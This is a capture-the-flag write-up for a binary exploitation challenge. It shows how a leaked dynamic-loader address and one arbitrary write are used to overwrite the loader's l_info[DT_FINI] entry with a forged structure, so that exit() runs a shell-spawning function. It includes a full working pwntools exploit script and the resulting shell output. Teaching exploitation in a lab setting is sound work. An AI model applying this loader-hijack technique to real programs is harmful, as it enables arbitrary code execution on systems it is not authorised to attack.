# 33. Atropos' Thread

Author: x3n0

Phase 3 | pwn

Flag: `labyrinth{4tr0p0s_sh33rs_l34ds_y0u_t0_3lys1um}`

## Description

It seems that your break in and escape attempt have been noticed by the higher ups at Minos Corp. They command Atropos of the three fates to cut the thread of your life. Will you let it end like this?

## Solve

We get a single binary `chall` and a Dockerfile. Checking the Dockerfile we get that glibc is **2.35**.

Checking out the binary we see that its a normal x86-64 dynamically linked binary.

```
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
       dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
       ... not stripped
```

Now we look at the protections, doing checksec on the binary reveals that,
It's **non-PIE** and it isn't stripped, so we have fixed address for data inside the binary itself.

```
$ checksec ./chall
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Then we see Full RELRO and a canary, so GOT overwrite is not possible and no stack smash.

Now checking out the decomp the whole program is tiny,

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // [rsp+8h] [rbp-18h] BYREF
  __int64 v4[2]; // [rsp+10h] [rbp-10h] BYREF

  v4[1] = __readfsqword(0x28u);
  setup(argc, argv, envp);
  printf("a thread of fate reveals itself: %p\n", &_tls_get_addr);
  printf("an offering to the moirai: ");
  read(0, &bruh, 0x18uLL);
  puts("Tell me the thread and the fate which should be replaced");
  printf("Thread fate: ");
  if ( (unsigned int)__isoc99_scanf("%llu %llu", &v3, v4) != 2 )
    exit(1);
  *v3 = v4[0];
  exit(0);
}
```

```c
unsigned __int64 win()
{
  char *argv[3]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  argv[0] = "/bin/sh";
  argv[1] = 0LL;
  execve("/bin/sh", argv, 0LL);
  return v2 - __readfsqword(0x28u);
}
```

```c
.bss:0000000000404030                 public bruh
.bss:0000000000404030 bruh            db    ? ;               ; DATA XREF: main+5C↑o
```

the things that pop out are a `win` function and a 24 byte array in `.bss` called `bruh` and it leaks a functions called `__tls_get_addr`.

Looking into this we can see that the `__tls_get_addr` functions lives inside the dynamic loader (ld.so), so we can guess that the solve is somehow related to the loader rather than the usual glibc related solve.

at the end of `main` we can see that it takes two values an address into `v3` and a value into `v4` then sets value at `v3` to `v4` via `*v3 = v4[0]`, this means we have an arbitrary write at any point inside the binary.

Finally the binary called `exit(0)` instead of just returning normally.

Now we know that the final goal is somehow getting to run the `win` function, with the help of a leak inside the loader and a single arbitrary write.

With some little research and some knowledge, you can find that calling exit(0), the loader (ld.so) walks the loaded objects and looks at its `link_map`, 
inside the `link_map` there is an array called `l_info[]` which holds pointers to ELF Dynamic entries of `Elf64_Dyn`'s.

With some familiarity with glibc source code we can find this snippet inside **`dl-close.c`**
```c
static void
call_destructors (void *closure)
{
  struct link_map *map = closure;

  if (map->l_info[DT_FINI_ARRAY] != NULL)
    {
      ElfW(Addr) *array =
	(ElfW(Addr) *) (map->l_addr
			+ map->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
      unsigned int sz = (map->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
			 / sizeof (ElfW(Addr)));

      while (sz-- > 0)
	((fini_t) array[sz]) ();
    }

  /* Next try the old-style destructor.  */
  if (map->l_info[DT_FINI] != NULL)
    DL_CALL_DT_FINI (map, ((void *) map->l_addr
			   + map->l_info[DT_FINI]->d_un.d_ptr));
}

```
here to unload the objects, it calls the destructors, in out particular case we can see that if either `l_info[DT_FINI_ARRAY]` or the old-style `l_info[DT_FINI]` is not NULL, we can get a arbitrary function call, which is exactly what we need.

So now we know what to do, we forge an element like the ones in `l_info[]` array, and replace the one at either one of the above to it.

first we use the leak of `__tls_get_addr`, subtract its offset in the loader to get the `ld_base`,
then use the 24 bytes in `bruh` to forge a tiny fake dynamic entry / destructor pair,
use the arbitrary write to point the loader's `l_info[13]` at our forged structure,
and finally let `exit(0)` run, the loader calls the "destructor", and we land in `win()`.


Forging the struct is simple
```c
typedef struct {
    int64_t d_tag;
    union {
        uint64_t d_val;
        uint64_t d_ptr;
    } d_un;
} Elf64_Dyn;
```
the actual struct resembles something like this, but we can simplify our payload to be something like what i've shown below to fit inside a 24 byte area.

```
bruh+0x00 : win          the function we want executed
bruh+0x08 : 13           d_tag = DT_FINI
bruh+0x10 : bruh         point back to the win
```

`bruh+0x08` is the fake `Elf64_Dyn`: its tag says `DT_FINI` (13) and its pointer value points at `bruh`, where `win` is stored. Then the overwrite writes `bruh+0x08` into the loader's `l_info[13]` slot, so the loader's `DT_FINI` entry now resolves to our fake one, whose target is `win`.

In our solve it'll look something like this

```python
fake_fini      = bss_addr          # holds win
fake_elf64_dyn = bss_addr + 8      # { d_tag = 13, d_ptr = fake_fini }
```

and the arbitrary write value is `fake_elf64_dyn`.

we can get the offset straight from the loader inside the docker container :

```
__tls_get_addr   @ 0x181d0
l_info[13]       @ 0x3b3f0   (DT_FINI slot inside _rtld_global)
```
Now finally putting the solve together we get 

```python
import sys
from pwn import *

context.binary = exe = ELF('./chall')
context.terminal = ['kitty', '-e']
context.log_level = 'info'

p = process(exe.path)
#p = remote("localhost", 1337)

p.recvuntil(b'itself: ')
leak = int(p.recvline().strip(b'\n').strip(), 16)
print(f"leak: {hex(leak)}")
ld_base = leak - 0x181d0
print(f"ld base: {hex(ld_base)}")

l_info13 = ld_base + 0x3b3f0

win      = exe.sym['win']
bss_addr = exe.sym['bruh']

fake_fini      = bss_addr
fake_elf64_dyn = bss_addr + 8

payload  = p64(win)
payload += p64(13)
payload += p64(fake_fini)

p.sendlineafter(b"moirai: ", payload)
sleep(0.1)

p.sendlineafter(b"fate: ", f"{l_info13} {fake_elf64_dyn}".encode())

p.interactive()
```

Running the solve gives us :

```
$ python3 solve.py
[+] Opening connection to localhost on port 1337: done
leak: 0x7f2c1a4b51d0
ld base: 0x7f2c1a49d000
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
labyrinth{4tr0p0s_sh33rs_l34ds_y0u_t0_3lys1um}
```

